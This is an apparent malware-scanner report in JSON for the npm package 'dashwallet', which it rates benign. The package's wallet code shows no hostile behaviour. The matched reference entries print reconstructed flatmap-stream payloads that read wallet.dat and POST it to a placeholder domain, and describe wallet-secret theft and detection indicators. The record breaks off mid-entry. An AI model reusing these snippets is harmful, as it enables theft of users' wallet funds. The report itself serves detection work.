@@ -1,0 +1,494 @@
+{
+  "package_name": "dashwallet",
+  "package_version": "0.7.1",
+  "label": "benign",
+  "detection_time": "2026-05-26T18:14:52.870768",
+  "status": "success",
+  "selected_files_count": 3,
+  "selected_files": [
+    "package/package.json",
+    "package/index.js",
+    "package/dashwallet.js"
+  ],
+  "is_malicious": false,
+  "total_files": 3,
+  "malicious_files": 0,
+  "total_slices": 1,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/dashwallet/0.7.1/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/dashwallet/0.7.1/package/index.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/dashwallet/0.7.1/package/dashwallet.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "dashwallet_slice_1",
+          "code_snippet": "(function (exports) {\n  \"use strict\";\n\n  let Wallet = {};\n  //@ts-ignore\n  exports.Wallet = Wallet;\n\n  let DashApi = {};\n  //@ts-ignore\n  let DashHd = exports.DashHd || require(\"dashhd\");\n  //@ts-ignore\n  let DashKeys = exports.DashKeys || require(\"dashkeys\");\n  //@ts-ignore\n  let DashPhrase = exports.DashPhrase || require(\"dashphrase\");\n  //@ts-ignore\n  let DashTx = exports.DashTx || require(\"dashtx\");\n  let dashTx = DashTx.create();\n\n  const DUFFS = 100000000;\n  const DUST = 10000;\n  const FEE = 1000;\n  DashApi.DUFFS = DUFFS;\n\n  DashApi.DashTypes = {\n    name: \"dash\",\n    pubKeyHashVersion: \"4c\",\n    privateKeyVersion: \"cc\",\n    coinType: \"5\",\n  };\n\n  DashApi.DUST = DUST;\n  DashApi.FEE = FEE;\n\n  const SATOSHIS = 100000000;\n  Wallet.SATOSHIS = SATOSHIS;\n\n  const XPUBS_WALLET = \"__XPUBS__\";\n  const ADDRS_WALLET = \"__ADDRS__\";\n  const XPUB_CHAR_LEN = 111;\n  const ADDR_CHAR_LEN = 34;\n\n  let XPUB_VERSIONS = [\"xpub\", \"tpub\"];\n  let ADDR_VERSIONS = [\"X\", \"Y\"];\n\n  /** @param {Number} satoshis */\n  function toDustFixed(satoshis) {\n    let dashNum = satoshis / SATOSHIS;\n    let dash = dashNum.toFixed(8);\n    dash = dash.slice(0, 6) + \" \" + dash.slice(6);\n    return dash;\n  }\n\n  /**\n   * @param {Config} config\n   * @returns {Promise<WalletInstance>}\n   */\n  Wallet.create = async function (config) {\n    let safe = config.safe;\n    let wallet = {};\n    let dashsight = config.dashsight;\n\n    // TODO: move to config\n    wallet.__DENOMS__ = Wallet.DENOM_SATS;\n    let __LAST_DENOM__ = wallet.__DENOMS__.length - 1;\n    wallet.__MIN_DENOM__ = Wallet.DENOM_SATS[__LAST_DENOM__];\n    wallet.__STAMP__ = 200;\n    wallet.__MIN_STAMPS__ = 2;\n\n    if (!config.denomAmounts?.length) {\n      config.denomAmounts = Wallet.DENOM_AMOUNTS;\n    }\n    config.denomSatoshis = amountsToSats(config.denomAmounts, []);\n\n    if (\"undefined\" === typeof config.staletime) {\n      config.staletime = 60 * 1000;\n    }\n\n    // TODO rename shareXPubWith, receiveXPubFrom, receiveAddrFrom?\n    /** @type {Contact} */\n    wallet.contact = async function ({\n      handle,\n      xpub,\n      address,\n      addr,\n      legacyPrefix,\n    }) {\n      address = address || addr || \"\";\n      if (!handle) {\n        throw new Error(`no 'handle' given`);\n      }\n\n      let specials = [\"main\", \"savings\", \"wifs\"];\n      let ihandle = handle.toLowerCase();\n      let isSpecial = specials.includes(ihandle);\n      if (isSpecial) {\n        throw new Error(`${handle} may not be used as a contact name`);\n      }\n\n      if (!legacyPrefix) {\n        let prefixes = [\"#\", \"@\"]; \n        let prefix = handle[0];\n        let validPrefix = prefixes.includes(prefix);\n        if (!validPrefix) {\n          throw new Error(\n            `contact names should start with '#' (ex: '#john') for local contacts, or '@' for live-wallet/self-published contacts (ex: '@john.dev'), not '${handle}'`,\n          );\n        }\n      }\n\n      let safe = config.safe;\n\n      /** @type {PayWallet} */\n      let txWallet;\n      let hasAddr = xpub || address;\n      if (hasAddr) {\n        txWallet = await _getOrCreateWallet(handle, xpub, address);\n        // most recently added will sort first;\n        txWallet.priority = Date.now();\n        await config.store.save(safe.payWallets);\n      } else {\n        let txws = await wallet.findPayWallets({ handle });\n        txWallet = txws[0];\n      }\n\n      /** @type {PrivateWallet} */\n      let rxWallet;\n      /** @type {Array<PrivateWallet>} */\n      let rxws = Object.values(safe.privateWallets)\n        .filter(function (wallet) {\n          return wallet.contact === handle;\n        })\n        .sort(wallet._sort);\n      if (!rxws.length) {\n        // TODO use main wallet as seed\n        rxWallet = await Wallet.generate({\n          name: handle,\n          label: handle,\n          priority: Date.now(),\n          contact: handle,\n        });\n\n        for (let i = 1; ; i += 1) {\n          if (!safe.privateWallets[`${handle}:${i}`]) {\n            safe.privateWallets[`${handle}:${i}`] = rxWallet;\n            break;\n          }\n        }\n        await config.store.save(safe.privateWallets);\n\n        rxws.push(rxWallet);\n      }\n      rxWallet = rxws[0];\n      // Note: we should never have a WIF wallet here\n\n      _transitionPhrase(rxWallet); // TODO remove\n\n      let salt = \"\";\n      let seed = await DashPhrase.toSeed(rxWallet.phrase, salt);\n      let walletKey = await DashHd.fromSeed(seed);\n      // The full path looks like `m/44'/5'/0'/0/0`\n      // We \"harden\" the prefix `m/44'/5'/0'/0`\n      let account = 0;\n      let usage = 0;\n      let hdPath = `m/44'/${COIN_TYPE}'/${account}'/${usage}`;\n      /** @type {import('dashhd').HDXKey} */\n      let xprvKey = await DashHd.derivePath(walletKey, hdPath);\n      let selfXPub = await DashHd.toXPub(xprvKey);\n      return [selfXPub, txWallet];\n    };\n    wallet.befriend = wallet.contact;\n\n    /**\n     * @param {String} handle - contact's handle\n     * @param {String} xpub\n     * @param {String} address\n     * @returns {Promise<PayWallet>}\n     */\n    async function _getOrCreateWallet(handle, xpub, address) {\n      if (xpub) {\n        await Wallet.assertXPub(xpub);\n      }\n\n      let txWallet = Object.values(safe.payWallets)\n        .sort(wallet._sort)\n        .find(function (wallet) {\n          if (wallet.contact !== handle) {\n            return false;\n          }\n\n          if (xpub.length > 0) {\n            return xpub === wallet.xpub;\n          }\n\n          if (address.length > 0) {\n            return address === wallet.address || wallet.addr;\n          }\n\n          return false;\n        });\n      if (!txWallet) {\n        txWallet = Wallet.generatePayWallet({\n          handle: handle,\n          xpub: xpub,\n          address: address,\n        });\n        for (let i = 1; ; i += 1) {\n          if (!safe.payWallets[`${handle}:${i}`]) {\n            safe.payWallets[`${handle}:${i}`] = txWallet;\n            break;\n          }\n        }\n      }\n      return txWallet;\n    }\n\n    /**\n     * @param {Array<MaybeHasAddress>} utxos\n     * @returns {Promise<Array<Uint8Array>>} - wifs\n     */\n    wallet._utxosToPrivKeys = async function (utxos) {\n      /** @type {Array<Uint8Array>} */\n      let privKeys = [];\n\n      await utxos.reduce(async function (promise, utxo) {\n        await promise;\n\n        if (!utxo.address) {\n          let msg = `'address' must be assigned before attempting to retrieve private key`;\n          throw new Error(msg);\n        }\n\n        let wifInfo = await wallet.findWif({\n          address: utxo.address,\n          addr: utxo.address,\n          _error: true,\n        });\n        if (!wifInfo) {\n          return;\n        }\n\n        //@ts-ignore TODO bad type export\n        let privKey = await DashKeys.wifToPrivKey(wifInfo.wif);\n        privKeys.push(privKey);\n      }, Promise.resolve());\n\n      return privKeys;\n    };\n\n    /**\n     * @param {Object} opts\n     * @param {String} opts.address - pay address\n     * @param {String} [opts.addr] - deprecated, use address\n     * @param {Boolean} opts._error - for internal use\n     * @returns {Promise<WalletWif?>} - addr info with wif\n     */\n    wallet.findWif = async function ({ address, addr, _error }) {\n      address = address || addr || \"\";\n      let wifData = await wallet._findWif(address).catch(function (err) {\n        if (_error || \"E_NO_PRIVATE_KEY\" !== err.code) {\n          throw err;\n        }\n      });\n      if (!wifData) {\n        return null;\n      }\n\n      let addrInfo = safe.cache.addresses[address];\n      return Object.assign(\n        { address: address, addr: address, wif: wifData.wif },\n        addrInfo,\n      );\n    };\n\n    /**\n     * @param {String} address - pay address\n     */\n    wallet._findWif = async function (address) {\n      let addrInfo = safe.cache.addresses[address];\n      if (!addrInfo) {\n        throw new Error(`cannot find address info for '${address}'`);\n      }\n\n      let isSpendable = hasWif(addrInfo);\n      if (!isSpendable) {\n        let err = new Error(\n          `private key for '${address}' has not been imported`,\n        );\n        //@ts-ignore\n        err.code = \"E_NO_PRIVATE_KEY\";\n        throw err;\n      }\n\n      let w = Object.values(safe.privateWallets).find(function (wallet) {\n        return wallet.name === addrInfo.wallet;\n      });\n      if (!w) {\n        throw new Error(`cannot find wallet for '${address}'`);\n      }\n\n      let isLooseWif = hasLooseWif(addrInfo);\n      if (isLooseWif) {\n        let wifInfo = w.wifs.find(\n          /** @param {WifInfo} wifInfo */\n          function (wifInfo) {\n            return address === (wifInfo.address || wifInfo.addr);\n          },\n        );\n        return {\n          _wallet: w,\n          wif: wifInfo.wif,\n        };\n      }\n\n      _transitionPhrase(w); // TODO remove\n\n      let salt = \"\";\n      let seed = await DashPhrase.toSeed(w.phrase, salt);\n      let walletKey = await DashHd.fromSeed(seed);\n\n      /** @type {import('dashhd').HDXKey} */\n      let xprvKey = await DashHd.derivePath(walletKey, addrInfo.hdpath);\n\n      let addressKey = await deriveAddress(xprvKey, addrInfo.index);\n      let _address = await DashHd.toAddr(addressKey.publicKey);\n\n      if (_address !== address) {\n        throw new Error(\n          `check fail: hdpath '${addrInfo.hdpath}/${addrInfo.index}' for '${address}' derived '${_address}'`,\n        );\n      }\n      if (!addressKey.privateKey) {\n        // this can never happen since xprvKey is private\n        throw new Error(`TypeGuard`);\n      }\n      let wif = await DashHd.toWif(addressKey.privateKey);\n\n      return { _wallet: w, wif: wif };\n    };\n\n    /**\n     * @param {Object} opts\n     * @param {String} opts.address - pay address\n     * @param {String} [opts.addr] - deprecated, use address\n     * @param {Boolean} opts._error - for internal use\n     * @returns {Promise<WalletWif?>} - addr info with wif\n     */\n    wallet.removeWif = async function ({ address, addr }) {\n      address = address || addr || \"\";\n      let addrInfo = safe.cache.addresses[address];\n      if (!addrInfo) {\n        return null;\n      }\n\n      let wifData = await wallet._findWif(address).catch(function (err) {\n        if (\"E_NO_PRIVATE_KEY\" !== err.code) {\n          throw err;\n        }\n        return null;\n      });\n      if (!wifData) {\n        return null;\n      }\n\n      let wifIndex = wifData._wallet.wifs.findIndex(\n        /** @param {WifInfo} wifInfo */\n        function (wifInfo) {\n          return wifInfo.addr === addr;\n        },\n      );\n      wifData._wallet.wifs.splice(wifIndex, 1);\n      await config.store.save(safe.cache);\n\n      // TODO should there be an importAddr as compliment of importWif?\n      delete safe.cache.addresses[address];\n      await config.store.save(safe.cache);\n\n      return Object.assign(\n        { address: addr, addr: addr, wif: wifData.wif },\n        addrInfo,\n      );\n    };\n\n    /**\n     * @param {WalletAddress} addrInfo\n     */\n    function hasWif(addrInfo) {\n      return !!addrInfo.hdpath;\n    }\n\n    /**\n     * @param {WalletAddress} addrInfo\n     */\n    function hasLooseWif(addrInfo) {\n      return \"*\" === addrInfo.hdpath;\n    }\n\n    /**\n     * @param {import('dashtx').TxInfoSigned} txInfo\n     */\n    function summarizeDonationTx(txInfo) {\n      let totalAvailable = 0;\n      for (let coin of txInfo.inputs) {\n        //@ts-ignore - our inputs are mixed with CoreUtxo\n        totalAvailable += coin.satoshis;\n      }\n\n      let fee = totalAvailable;\n\n      let changeSats = 0;\n      let change = txInfo.outputs[1];\n      if (change) {\n        changeSats = change.satoshis;\n      }\n      fee -= changeSats;\n\n      let summary = Object.assign(txInfo, {\n        total: totalAvailable,\n        fee: fee,\n        change: change,\n      });\n\n      return summary;\n    }\n\n    /**\n     * @param {import('dashhd').HDXKey} xKey\n     * @param {Number} index\n     * @returns {Promise<import('dashhd').HDXKey>}\n     */\n    async function deriveAddress(xKey, index) {\n      let hardened = false;\n      let addressKey = await DashHd.deriveChild(xKey, index, hardened);\n      return addressKey;\n    }\n\n    /**\n     * @param {Array<Number>} amounts\n     * @param {Array<Number>} sats\n     */\n    function amountsToSats(amounts, sats) {\n      for (let amount of amounts) {\n        let satoshis = amount * SATOSHIS;\n        satoshis = Math.round(satoshis);\n        sats.push(satoshis);\n      }\n      return sats;\n    }\n\n    /**\n     * @param {Object} w\n     * @param {Array<String>} [w.mnemonic]\n     * @param {String} [w.phrase]\n     */\n    function _transitionPhrase(w) {\n      //@ts-ignore\n      if (w.mnemonic?.length > 0) {\n        //@ts-ignore\n        w.phrase = w.mnemonic;\n      }\n      if (!w.phrase) {\n        w.phrase = \"\";\n      }\n\n      let isMnemonic = Array.isArray(w.phrase);\n      if (isMnemonic) {\n        //@ts-ignore\n        w.phrase = w.phrase.filter(Boolean).join(\" \");\n      }\n    }\n\n    if (!safe.cache) {\n      safe.cache = { addresses: {} };\n    }\n    if (!safe.cache.addresses) {\n      safe.cache.addresses = {};\n    }\n    if (!safe.payWallets) {\n      safe.payWallets = {};\n    }\n    if (!safe.preferences) {\n      safe.preferences = {};\n    }\n    if (!safe.privateWallets) {\n      safe.privateWallets = {};\n    }\n    if (!safe.privateWallets.savings) {\n      safe.privateWallets.savings = await Wallet.generate({\n        name: \"savings\",\n        label: \"Savings\",\n        priority: 10,\n      });\n      await config.store.save(safe.privateWallets);\n    }\n    if (!safe.privateWallets.wifs) {\n      safe.privateWallets.wifs = await Wallet.generate({\n        label: \"WIFs\",\n        name: \"wifs\",\n        priority: 50,\n        wifs: [],\n      });\n      await config.store.save(safe.privateWallets);\n    }\n    if (!safe.privateWallets.main) {\n      safe.privateWallets.main = await Wallet.generate({\n        name: \"main\",\n        label: \"Main\",\n        priority: 100,\n      });\n      await config.store.save(safe.privateWallets);\n    }\n\n    return wallet;\n  };\n\n  if (\"undefined\" !== typeof module) {\n    module.exports = Wallet;\n  }\n})( (\"undefined\" !== typeof module && module.exports) || window);",
+          "is_malicious": false,
+          "malice_score": 0.5555645902951559,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code accesses and manages cryptocurrency wallet data including private keys, extended public keys (xpub), and addresses using cryptographic libraries (dashhd, dashkeys, dashphrase, dashtx). It reads and modifies wallet state stored in memory and persistent storage via config.store, derives keys and addresses from mnemonic phrases, and handles private key retrieval and validation. No network or file system operations are performed directly, but the code enables secure wallet management and transaction signing, facilitating cryptocurrency operations with potential security impact if private keys or wallet data are compromised.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a comprehensive implementation of a cryptocurrency wallet management module for Dash. It handles key derivation, wallet creation, private key retrieval, and address management using well-known cryptographic libraries (dashhd, dashkeys, dashphrase, dashtx). Unlike the known malicious patterns, it does not perform any obfuscated or conditional execution based on environment variables, nor does it access the filesystem directly or perform network operations such as exfiltrating data. The code operates on in-memory and persistent storage abstractions provided via config.store, which is typical for wallet management software. The presence of private key handling is expected and necessary for wallet functionality and is not suspicious by itself. There is no evidence of hidden payloads, obfuscation, or attempts to send sensitive data externally. Therefore, despite handling sensitive data, the code does not exhibit malicious intent or behavior similar to the known malware patterns.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_104227_879684_snippet_1",
+              "source_package": "flatmap-stream (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104227_879684/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5626331567764282,
+              "code_similarity": 0.4918711185455322,
+              "behavior_similarity": 0.6333951950073242,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Example (reconstructed from public reports):\nif (process.env.npm_package_name === 'copay-dash') {\n  // Malicious payload targeting specific application\n  var crypto = require('crypto');\n  var fs = require('fs');\n  var http = require('http');\n  // Read and exfiltrate wallet data\n  var walletData = fs.readFileSync('path/to/wallet.dat');\n  var options = { hostname: 'malicious-domain.com', port: 80, path: '/steal', method: 'POST' };\n  var req = http.request(options);\n  req.write(walletData);\n  req.end();\n}",
+                "code_behavior": "At runtime, when the package is loaded within a targeted application (such as copay-dash), the code checks the environment, reads sensitive wallet data from the filesystem, and sends this data via HTTP POST to a hardcoded malicious domain, resulting in the exfiltration of private keys and user assets.",
+                "malice_analysis": {
+                  "why_suspicious": "The code is obfuscated and conditionally executes only when running inside a specific application, accesses sensitive wallet files, and exfiltrates their contents to an external server. This targeted, stealthy behavior is characteristic of supply chain attacks aiming to steal high-value credentials.",
+                  "violated_expectations": "Legitimate npm packages should not contain hidden or obfuscated payloads that activate only in certain environments, nor should they access or transmit sensitive user data such as wallet files without explicit user consent. Normal dependencies do not perform targeted data exfiltration.",
+                  "similar_legitimate_use": "Legitimate telemetry or crash reporting may send anonymized, non-sensitive data to a vendor's server, but never private keys, wallet files, or other confidential user assets. Such reporting is also never obfuscated or hidden within a dependency.",
+                  "key_indicators": [
+                    "Obfuscated or minified code in a dependency with low prior usage",
+                    "Conditional execution based on environment variables or package name (e.g., process.env.npm_package_name === 'copay-dash')",
+                    "Access to sensitive files such as wallet.dat or private keys",
+                    "Outbound HTTP POST requests to hardcoded, suspicious domains from within a package dependency",
+                    "Presence of hidden payloads in the main entry point of a dependency"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when the package is required or executed in a Node.js process, specifically within targeted applications such as copay-dash)",
+                  "file_location": "flatmap-stream/index.js (main entry point, containing obfuscated payload)",
+                  "required_permissions": [
+                    "filesystem (read access to wallet files)",
+                    "network (outbound HTTP requests)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "flatmap-stream",
+                  "package_manager": "npm",
+                  "package_versions": "0.1.1",
+                  "why_malicious": "The flatmap-stream package was intentionally modified to include obfuscated, crypto-stealing malicious code. This code was designed to activate only in specific application contexts (notably, the copay-dash wallet app), exfiltrating sensitive wallet data to an attacker-controlled server. The package was then added as a dependency to the widely used event-stream package, resulting in a large-scale supply chain attack that propagated the malicious payload to numerous downstream projects and even VS Code extensions, putting developer credentials and assets at risk."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious, obfuscated code is added to flatmap-stream and published to npm.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Inclusion as a dependency in the event-stream package."
+                  },
+                  {
+                    "step": 2,
+                    "action": "event-stream package (v3.3.6) is updated to depend on the malicious flatmap-stream version.",
+                    "implemented_by": [],
+                    "leads_to": "Propagation to all projects and packages using event-stream@3.x.x."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Downstream npm packages and VS Code extensions include event-stream@3.x.x as a dependency, unknowingly pulling in flatmap-stream.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is included in VS Code extensions and other projects."
+                  },
+                  {
+                    "step": 4,
+                    "action": "VS Code extensions are auto-updated on developer machines, bringing in the malicious dependency chain.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is present and ready to execute on developer systems at next VS Code startup."
+                  },
+                  {
+                    "step": 5,
+                    "action": "Malicious code executes in the context of the developer's environment, conditionally targeting specific applications (e.g., copay-dash) and exfiltrating sensitive data.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Compromise of developer credentials, wallet files, and other sensitive assets."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Conditional execution of code based on environment variables or package name (e.g., process.env.npm_package_name === 'copay-dash')",
+                    "Access to sensitive files such as wallet.dat, private keys, or cryptocurrency wallet data within Node.js dependencies",
+                    "Outbound HTTP or HTTPS POST requests to hardcoded or previously unknown domains from package dependencies",
+                    "Obfuscated or minified code present in dependencies with low download counts or recent, unexplained updates"
+                  ],
+                  "file_indicators": [
+                    "flatmap-stream/index.js containing obfuscated or suspicious code",
+                    "event-stream/package.json listing flatmap-stream as a dependency",
+                    "VS Code extensions or npm projects with flatmap-stream or event-stream@3.x.x in their dependency tree"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP/HTTPS POST requests to domains such as malicious-domain.com from developer or build environments",
+                    "Network connections initiated by Node.js processes during package installation or runtime to unknown or suspicious endpoints"
+                  ],
+                  "how_to_detect": "Monitor for the presence of flatmap-stream or event-stream@3.x.x in the dependency trees of Node.js projects and VS Code extensions. Use static analysis to scan for obfuscated or minified code in flatmap-stream/index.js, especially code that conditionally executes based on environment variables or package names. Flag any code that accesses wallet.dat or other sensitive files and attempts outbound network connections to hardcoded domains. Correlate network telemetry to detect HTTP/HTTPS POST requests to suspicious domains from development or CI environments, particularly during package installation or extension updates."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_780687_snippet_3",
+              "source_package": "web3_nextjs_backend (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_780687/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5596281886100769,
+              "code_similarity": 0.49182283878326416,
+              "behavior_similarity": 0.6274335384368896,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "// Reads environment variables or local files for wallet info\nconst wallet = process.env.METAMASK_WALLET || readFileSync('wallet.txt');",
+                "code_behavior": "At runtime, the code accesses the METAMASK_WALLET environment variable or reads wallet information from a local file ('wallet.txt'), collecting sensitive wallet secrets for potential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "Accessing wallet secrets or environment variables without explicit user intent or secure handling is a significant red flag, especially in the context of a job interview exercise where such data should not be required.",
+                  "violated_expectations": "Legitimate code should only access or export wallet secrets when explicitly required, with user consent, and must handle such data securely. Unprompted access to secrets is not acceptable.",
+                  "similar_legitimate_use": "Wallet integration code may access secrets for legitimate operations, but only with clear user consent, secure storage, and no unauthorized export.",
+                  "key_indicators": [
+                    "Access to sensitive wallet data via environment variables or local files",
+                    "No user prompt or secure handling of secrets",
+                    "Potential for collected secrets to be exfiltrated externally",
+                    "References to wallet, MetaMask, or secret keys in code"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "backend code (potentially in wallet integration logic)",
+                  "required_permissions": [
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "web3_nextjs_backend",
+                  "package_manager": "npm",
+                  "package_versions": "GitHub-only, not published to npmjs.com",
+                  "why_malicious": "The package contains code that opens a network port and listens for unauthenticated connections, enabling potential remote access or reverse shell attacks. It also exfiltrates sensitive data, such as crypto wallet secrets, by reading environment variables or local files and sending them to an external, attacker-controlled domain under the pretense of a job interview exercise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Victim clones and runs the backend and frontend npm projects locally as part of a job interview exercise.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code execution on victim's machine"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Backend code opens TCP port 5000 and listens for incoming connections, potentially enabling remote access or reverse shell.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker may gain remote access to the victim's machine"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious code accesses environment variables or local files to extract wallet information.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Sensitive wallet data is collected"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Collected data is exfiltrated to an external domain via HTTPS POST requests.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives wallet secrets and can drain the victim's crypto wallet"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Backend code opening arbitrary network ports (e.g., 5000) without clear documentation or authentication",
+                    "Outbound HTTPS POST requests to suspicious or unrelated domains (e.g., flickthebean.onrender.com)",
+                    "Access to environment variables or local files containing wallet or secret information without user consent"
+                  ],
+                  "file_indicators": [
+                    "Presence of code that listens on port 5000 in backend entry points (e.g., index.js, app.js)",
+                    "Hardcoded external domains in fetch or HTTP request code (e.g., flickthebean.onrender.com)",
+                    "References to wallet, MetaMask, or secret keys in code or configuration files"
+                  ],
+                  "network_indicators": [
+                    "Connections to flickthebean.onrender.com",
+                    "Unusual outbound HTTPS traffic immediately after running npm projects",
+                    "Unexpected inbound connections to local port 5000"
+                  ],
+                  "how_to_detect": "Monitor for npm projects or local development servers that open unexpected network ports or accept unauthenticated connections. Flag code that makes outbound requests to untrusted or hardcoded domains, especially when transmitting environment variables or wallet secrets. Use static analysis to detect hardcoded domains and references to sensitive data, and dynamic analysis to observe runtime network and file access behaviors."
+                }
+              }
+            },
+            {
+              "match_id": "20250105_195714_457400_snippet_1",
+              "source_package": "flatmap-stream (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250105_195714_457400/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5492408275604248,
+              "code_similarity": 0.49685704708099365,
+              "behavior_similarity": 0.601624608039856,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Obfuscated code (deobfuscated for clarity)\nif (process.env.npm_package_name === 'copay-dash') {\n  var fs = require('fs');\n  var http = require('http');\n  var walletData = fs.readFileSync('wallet.dat', 'utf8');\n  http.request({\n    hostname: 'malicious-domain.com',\n    method: 'POST',\n    path: '/exfil',\n    headers: { 'Content-Type': 'application/json' }\n  }, function(res) {}).end(JSON.stringify({ data: walletData }));\n}",
+                "code_behavior": "At runtime, when the infected application is executed and the environment variable npm_package_name equals 'copay-dash', the code reads the contents of wallet.dat from the filesystem and sends this data via HTTP POST to a hardcoded external domain, resulting in targeted exfiltration of sensitive wallet credentials.",
+                "malice_analysis": {
+                  "why_suspicious": "The code is obfuscated and conditionally executes only when the parent application is 'copay-dash', indicating a targeted attack. It accesses a sensitive file (wallet.dat) and exfiltrates its contents to an external server, which is a clear sign of malicious intent.",
+                  "violated_expectations": "A legitimate npm package should not access application-specific sensitive files or perform conditional network exfiltration based on the parent application's identity. Such behavior is outside the expected scope of a utility package and violates user trust and security boundaries.",
+                  "similar_legitimate_use": "Legitimate packages may perform telemetry or error reporting, but they do not access or transmit private keys or wallet files. Any access to wallet.dat or similar files is highly unusual and not justified in normal package operations.",
+                  "key_indicators": [
+                    "Conditional execution based on process.env.npm_package_name targeting 'copay-dash'",
+                    "Direct access to sensitive file 'wallet.dat' using fs.readFileSync",
+                    "Outbound HTTP POST request to a hardcoded external domain",
+                    "Obfuscated or minified code in the main package file",
+                    "Presence of code that only activates in specific downstream applications"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when the infected application is executed and process.env.npm_package_name matches 'copay-dash')",
+                  "file_location": "index.js (main file of flatmap-stream package)",
+                  "required_permissions": [
+                    "filesystem (read access to wallet.dat)",
+                    "network (outbound HTTP requests)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "flatmap-stream",
+                  "package_manager": "npm",
+                  "package_versions": "0.1.1 (and possibly others as a dependency of event-stream 3.3.6)",
+                  "why_malicious": "The flatmap-stream package was intentionally modified by a malicious maintainer to include obfuscated code that specifically targeted the Copay bitcoin wallet application. The malicious code, introduced as a dependency of the widely used event-stream package, was designed to exfiltrate sensitive wallet data to an attacker-controlled server, resulting in a targeted supply chain attack with widespread downstream impact."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious code is introduced into the flatmap-stream package, which is added as a dependency of event-stream.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Distribution of the malicious code to downstream applications that depend on event-stream."
+                  },
+                  {
+                    "step": 2,
+                    "action": "When a targeted application (specifically, copay-dash) is executed, the malicious code checks the environment and activates.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of code that accesses sensitive wallet data in the targeted application."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The malicious code reads the wallet.dat file from the filesystem and sends its contents to an attacker-controlled server via HTTP POST.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Exfiltration of sensitive wallet credentials, resulting in compromise of user funds and credentials."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Conditional code execution in npm dependencies based on process.env.npm_package_name or similar environment variables",
+                    "Access to sensitive files such as 'wallet.dat' within package code",
+                    "Obfuscated or minified code blocks in dependency main files (e.g., index.js)",
+                    "Unexpected outbound HTTP requests to hardcoded external domains at runtime from package code"
+                  ],
+                  "file_indicators": [
+                    "Presence of flatmap-stream as a dependency of event-stream in package-lock.json or npm-shrinkwrap.json",
+                    "Obfuscated or minified code in index.js or main files of flatmap-stream or its dependencies",
+                    "References to 'wallet.dat' or similar sensitive file names in package source code"
+                  ],
+                  "network_indicators": [
+                    "HTTP POST requests to unknown or suspicious domains (e.g., 'malicious-domain.com') originating from npm package code",
+                    "Outbound network connections initiated by dependencies that are not expected to perform networking"
+                  ],
+                  "how_to_detect": "Perform static analysis on npm packages and their dependencies to identify obfuscated code, references to sensitive files (such as 'wallet.dat'), and conditional logic based on environment variables like npm_package_name. Monitor runtime behavior for unexpected outbound HTTP requests from dependencies, especially those that are not expected to perform networking. Flag packages that contain code which activates only in specific downstream applications or accesses sensitive files. Correlate the presence of flatmap-stream as a dependency of event-stream with these behaviors to identify supply chain attacks."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_085475_snippet_1",
+              "source_package": "connect-kit (npm)",
